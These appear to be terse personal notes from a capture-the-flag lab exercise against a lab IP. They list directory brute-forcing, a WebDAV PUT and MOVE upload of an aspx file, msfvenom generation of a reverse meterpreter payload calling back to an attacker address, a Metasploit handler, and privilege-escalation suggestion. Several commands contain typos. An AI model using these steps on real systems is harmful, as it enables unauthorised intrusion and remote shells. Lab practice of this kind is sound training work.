	# how to use gobuster
	gobuster -w /usr/share/wordlist -u http://10.10.10.15 -L 20
	
	# Burp 
	PUT /ippsec.html HTTP/1.1 
	
	msfvenom -p linux/meterpreter/reverse tcp LHOST 10.10.14.4 LPORT=1337 -f aspx 
	
	copy into rerquest to upload. 
	
	> msfconsole 
	> user exploit/multi/handler
	> set LHOST tun0
	> set LPORT 1337
	
	change to OPTIONS 
	MOVE /ipsec.html http/1.1
	Destination: /ippsec.aspx
	
	> use post/multi/recon/local_exploit_suggester
	
	> set session 1 
	
	
	set lhost tun0
	
	locate auxilary/scanner | grep -i 'tcp' | grep -i scan 
	
	
	# nmap the elk server for OS 
	
	
	
	
	
	
	
	
	
	
	
	